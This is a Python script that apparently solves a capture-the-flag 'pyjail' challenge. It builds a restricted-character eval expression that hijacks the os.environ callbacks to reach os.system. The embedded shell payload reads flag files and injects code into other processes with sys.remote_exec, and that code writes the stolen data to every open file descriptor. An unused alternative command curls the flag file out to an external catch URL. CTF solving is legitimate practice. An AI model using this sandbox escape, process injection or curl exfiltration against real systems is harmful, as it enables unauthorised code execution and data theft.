#!/usr/bin/env python3
"""Build the eval expression for The pyjail: alphabet a-z plus :_.[], with ass, typ, als banned.
No whitespace is needed beside a bracket, so [[]for[TARGET]in[[VALUE]]] assigns inside an eval.
os._Environ.__setitem__ runs putenv(encodekey(k), encodevalue(v)); all three are overwritable."""
import json
import os as _os
import sys as _sys

HERE = _os.path.dirname(_os.path.abspath(__file__))
SRC = json.load(open(_os.path.join(HERE, '..', 'scratch', 'sources2.json')))

ALLOWED = set("abcdefghijklmnopqrstuvwxyz:_.[],")
BANNED = ('ass', 'typ', 'als')


def clean(expr):
    return all(c in ALLOWED for c in expr) and not any(b in expr for b in BANNED)


# ---------------------------------------------------------------- integers
ALLINTS = {int(k): v for k, v in SRC['allints'].items()}
SYSINTS = {int(k): v for k, v in SRC['sysints'].items()}


# Interpreter constants survive a rebuild of the same CPython; line numbers and code shapes don't, so they cost more.
STABLE_INT = ('sys.flags.', 'sys.float_info.', 'sys.int_info.',
              'sys.hash_info.', 'sys.thread_info.', 'sys.version_info.',
              'sys.implementation.', 'sys.abi_info.', 'sys.maxunicode',
              'sys.api_version')


def _int_cost(p):
    return (0 if p.startswith(STABLE_INT) else 1000) + len(p)


def _best_int_paths(table):
    out = {}
    for n, paths in table.items():
        ok = [p for p in paths if clean(p)]
        if ok:
            out[n] = min(ok, key=_int_cost)
    return out


IE_ALL = _best_int_paths(ALLINTS)
IE_SYS = _best_int_paths(SYSINTS)


def intexpr(n, sysonly=False):
    t = IE_SYS if sysonly else IE_ALL
    if n in t:
        return t[n]
    raise KeyError(n)


def decomp(n, sysonly=False):
    """Write n as a sum of directly available integers (greedy)."""
    t = IE_SYS if sysonly else IE_ALL
    avail = sorted([v for v in t if v > 0], reverse=True)
    parts = []
    rest = n
    while rest > 0:
        for a in avail:
            if a <= rest:
                parts.append(a)
                rest -= a
                break
        else:
            raise ValueError('cannot decompose %d' % n)
    return parts


# ---------------------------------------------------------------- strings
# These depend on how the interpreter started, so their dumped value differs inside user.py and corrupts a slice.
UNSTABLE = ('argv', '__main__', 'environ', 'warnoptions', 'path[', 'ps1',
            'ps2', '_xoptions', 'getcwd', 'co_filename', '__file__')


def usable_paths(sysonly):
    strs = SRC['sysstrs'] if sysonly else SRC['allstrs']
    out = {}
    for p, v in strs.items():
        if any(u in p for u in UNSTABLE):
            continue
        if '[IDX' in p:
            base, rest = p.split('[IDX', 1)
            idx = int(rest.split(']')[0])
            try:
                e = base + '[' + intexpr(idx, sysonly) + ']'
            except KeyError:
                continue
        else:
            e = p
        if clean(e):
            out.setdefault(v, []).append(e)
    return out


STR_ALL = usable_paths(False)
STR_SYS = usable_paths(True)


def _str_cost(path, i):
    """Prefer stable, short, low-index sources."""
    c = len(path) + 4 * i
    if path.endswith('__name__') or path.endswith('__qualname__'):
        c -= 40
    if '__doc__' in path:
        c += 20
    return c


def slice_expr(path, i, L, sysonly=False):
    e = path
    if i:
        for a in decomp(i, sysonly):
            e += '[' + intexpr(a, sysonly) + ':]'
    e += '[:' + intexpr(L, sysonly) + ']'
    return e


def find_piece(text, sysonly=False, maxlen=14):
    """Return (expression, length) for the longest prefix of `text` sliceable from a reachable string."""
    table = STR_SYS if sysonly else STR_ALL
    for L in range(min(maxlen, len(text)), 0, -1):
        want = text[:L]
        best = None
        for val, paths in table.items():
            i = val.find(want)
            if i < 0:
                continue
            for p in paths:
                try:
                    e = slice_expr(p, i, L, sysonly)
                except (KeyError, ValueError):
                    continue
                cost = _str_cost(p, i) + len(e)
                if best is None or cost < best[0]:
                    best = (cost, e)
        if best:
            return best[1], L
    raise ValueError('no source for %r' % text[:1])


def string_list(text, sysonly=False):
    """A python list display whose ''.join is `text`."""
    parts = []
    pos = 0
    while pos < len(text):
        e, L = find_piece(text[pos:], sysonly)
        parts.append(e)
        pos += L
    return '[' + ','.join(parts) + ']', len(parts)


def exact_string(text, sysonly=False):
    """A single expression evaluating to `text` (no join available)."""
    table = STR_SYS if sysonly else STR_ALL
    best = None
    for val, paths in table.items():
        i = val.find(text)
        if i < 0:
            continue
        for p in paths:
            try:
                e = slice_expr(p, i, len(text), sysonly)
            except (KeyError, ValueError):
                continue
            c = _str_cost(p, i) + len(e)
            if best is None or c < best[0]:
                best = (c, e)
    if best is None:
        raise ValueError('no single source for %r' % text)
    return best[1]


# ---------------------------------------------------------------- payload
# Runs inside jail.py. The 30 x 0.3 s loop keeps jail.py from returning to accept(), so the client fd stays put.
# No gc.get_objects() sweep: on a CPU-limited pod it outlasts the read window and wedges the instance.
SCRIPT_X = (
    'import os,time\\n'
    'd=open("/tmp/f","rb").read()\\n'
    'for i in range(30):\\n'
    ' for f in os.listdir("/proc/self/fd"):\\n'
    '  try:os.write(int(f),d)\\n'
    '  except:pass\\n'
    ' time.sleep(0.3)\\n'
)
SCRIPT_Y = (
    'import sys,os\\n'
    'for p in os.listdir("/proc"):\\n'
    ' try:sys.remote_exec(int(p),"/tmp/x")\\n'
    ' except:pass\\n'
)
# Unused HTTP channel, since CMD is CMD_SOCKET. A /ping without a /post means egress works and the flag read failed.
CATCH = _os.environ.get("CATCH_URL", "https://example.trycloudflare.com")
CMD_CATCH = ("u=" + CATCH + ";"
             "curl -sm9 $u/ping;"
             "curl -sm9 -d@/flag.txt $u/post;"
             "curl -sm9 -G --data-urlencode f@/flag.txt $u/q")

# SCRIPT_Y remote_execs SCRIPT_X into every PID it can, and jail.py then writes /tmp/f to each of its open fds.
# /tmp/f also holds a listing of /, so an empty reply means the write failed, not that the flag is missing.
CMD_SOCKET = ("cat /flag* /*flag* >/tmp/f 2>&1;ls -la />>/tmp/f;"
              "printf '" + SCRIPT_X + "'>/tmp/x;"
              "printf '" + SCRIPT_Y + "'>/tmp/y;"
              "python3 /tmp/y")
CMD = CMD_SOCKET


def build(cmd=CMD):
    osstr = exact_string('os', sysonly=True)
    charlist, nparts = string_list(cmd, sysonly=False)
    steps = [
        '[[]for[sys.q]in[[sys.modules[%s]]]]' % osstr,
        '[[]for[sys.q.putenv]in[[sys.__setattr__]]]',
        '[[]for[sys.q.environ.encodekey]in[[sys.intern]]]',
        '[[]for[sys.q.environ.encodevalue]in[[sys.abiflags.join]]]',
        '[[]for[sys.q.environ[sys.platform]]in[[%s]]]' % charlist,
        '[[]for[sys.q.environ.encodekey]in[[sys.q.system]]]',
        'sys.q.environ[sys.linux]',
    ]
    expr = ','.join(steps)
    return expr, nparts


if __name__ == '__main__':
    cmd = _sys.argv[1] if len(_sys.argv) > 1 else CMD
    expr, nparts = build(cmd)
    bad = sorted({c for c in expr if c not in ALLOWED})
    _sys.stderr.write('cmd      : %r\n' % cmd)
    _sys.stderr.write('cmd len  : %d, join pieces: %d\n' % (len(cmd), nparts))
    _sys.stderr.write('expr len : %d\n' % len(expr))
    _sys.stderr.write('bad chars: %r\n' % bad)
    for b in BANNED:
        if b in expr:
            _sys.stderr.write('!! BANNED SUBSTRING PRESENT: %s\n' % b)
    _sys.stdout.write(expr)
